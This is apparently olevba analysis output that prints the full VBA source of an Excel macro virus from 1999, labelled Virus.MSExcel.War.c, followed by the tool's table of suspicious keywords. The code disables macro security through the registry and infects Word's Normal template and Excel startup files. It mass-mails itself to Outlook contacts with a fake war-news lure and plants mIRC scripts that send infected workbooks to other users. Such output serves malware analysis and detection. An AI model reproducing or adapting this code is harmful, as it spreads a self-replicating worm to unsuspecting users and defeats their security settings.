olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.War.c-9694240a77953450705f0c14f3c14c1b157181cf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Email.bas 
in file: Virus.MSExcel.War.c-9694240a77953450705f0c14f3c14c1b157181cf - OLE stream: '_VBA_PROJECT_CUR/VBA/Email'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Primeiro Excel Virus Brasileiro Para Excel97 e Excel2000 e Email e MIRC
'AlevirusS>C>S 1999!!
Sub Auto_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = 0
End If
Call Email
Call Estupro
Call Mirc
Call Dia
MkDir "c:\Arquivos de programas\Microsoft Office\Office\XLINICIO"
MkDir "c:\Programs Files\Microsoft Office\Office\XLINICIO"
Application.ScreenUpdating = 0
Application.DisplayAlerts = 0

If Tudo() Then
    GoTo SejaGay:
Else
    NoOlho
End If
SejaGay:
Application.OnSheetActivate = "ALEVIRUSCS.XLM!Puta"
fui:
End Sub
Function Tudo() As Boolean
Tudo = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "ALEVIRUSCS.XLM" Then
    For y = 1 To Application.Workbooks("ALEVIRUSCS.XLM").Modules.Count
        If Application.Workbooks("ALEVIRUSCS.XLM").Modules(y).Name = "Email" Then
            Tudo = True
        End If
    Next y
    End If
Next x
End Function

Function NoOlho()
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\ALEVIRUSCS.XLM"
  Workbooks.Open (Application.StartupPath + "\ALEVIRUSCS.XLM")
  Windows("ALEVIRUSCS.XLM").Visible = False
 Application.Workbooks("ALEVIRUSCS.XLM").Save
End Function

Function Amerda() As Boolean
activebook = ActiveWorkbook.Name
Amerda = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "Email" Then
            Amerda = True
   End If
Next y
End Function

Sub Puta()
    oactivebook = ActiveWorkbook.Name
    If Amerda() Then
    GoTo cya
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("ALEVIRUSCS.XLM").Visible = True
    Workbooks("ALEVIRUSCS.XLM").Activate
    Sheets("Email").Visible = True
    Workbooks("ALEVIRUSCS.XLM").Sheets("Email").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("Email").Visible = False
    Workbooks("ALEVIRUSCS.XLM").Sheets("Email").Visible = False
    Windows("ALEVIRUSCS.XLM").Visible = False
cya:
Close
End Sub

Sub Auto_Close()
On Error Resume Next
Application.DisplayAlerts = False
Application.Workbooks("ALEVIRUSCS.XLM").Save
ActiveWorkbook.SaveCopyAs "C:\WINDOWS\WAR3.XLS"
ActiveWorkbook.SaveCopyAs "C:\WINDOWS\SEXO.XLS"
ActiveWorkbook.SaveCopyAs "C:\WINDOWS\FONE.XLS"
ActiveWorkbook.SaveCopyAs "C:\WINDOWS\AVP.XLS"
ActiveWorkbook.SaveCopyAs "C:\WINDOWS\CAIXA.XLS"
Call Dia
End Sub

Private Sub Estupro()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'AlevirusSCS<>EMAIL<>Excel<>Virus<>BRASIL<>1999!") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec()"
NT.InsertLines 2, "On Error Resume Next"
NT.InsertLines 3, "Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)"
NT.InsertLines 4, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 5, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 6, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 7, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub

Private Sub Email()
On Error Resume Next
Application.EnableCancelKey = 0
Randomize
Set oa = CreateObject("Outlook.Application")
Set mn = oa.GetNameSpace("MAPI")
If oa = "Outlook" Then
mn.Logon "profile", "password"
For y = 1 To mn.AddressLists.Count
x = 1
Set ab = mn.AddressLists(y)
Set alevirusscs = oa.CreateItem(0)
For z = 1 To ab.AddressEntries.Count
vi = ab.AddressEntries(x)
alevirusscs.Recipients.Add vi
x = x + 1
If x > 60 Then z = ab.AddressEntries.Count
Next z
alevirusscs.Subject = "Fwd: Milhons DEADS!!!"
alevirusscs.Body = "Urgent info inside. The III War is Begin!!! Read The Secret's in XLS!"
alevirusscs.Attachments.Add ActiveWorkbook.FullName
alevirusscs.Send
vi = ""
Next y
mn.Logoff
End If
End Sub

Private Sub Dia()
If Day(Now()) = 19 And Month(Now()) = 5 Then
        Assistant.Visible = True
        With Assistant.NewBalloon
            .Animation = msoAnimationGetAttentionMajor
            .Heading = "Atenção:"
            .Text = "Primeiro Excel97>Excel2000>Email>MIRC> Virus Brasileiro by AlevirusSCS [Brasil]1999!Em Breve Alevirus Excel97 Formula Virus!Mande-me Um EMAIL!fernanda88@hotmail.com"
            .Icon = msoIconAlert
            .Show
        End With
  End If
End Sub

Private Sub Mirc()
On Error Resume Next
Open "c:\mirc\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\war3.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\ninja40\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\sexo.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\ninja41\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\fone.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\ninja38\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\avp.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\ninja37\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\caixa.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\mirc40\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\fone.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\mirc41\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\avp.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\dusk\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\caixa.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\darkskie\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\war3.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\darksk~1\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\sexo.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
Open "c:\matchbox\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; AlevirusS>C>S WAR III Excel97>Excel2000>Email>MIRC Virus Brasil! 1999!"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\windows\caixa.xls"
Print #1, "n3=}"
Print #1, "n4=}"
Close 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Emai
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Plan
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Plan
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Plan
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

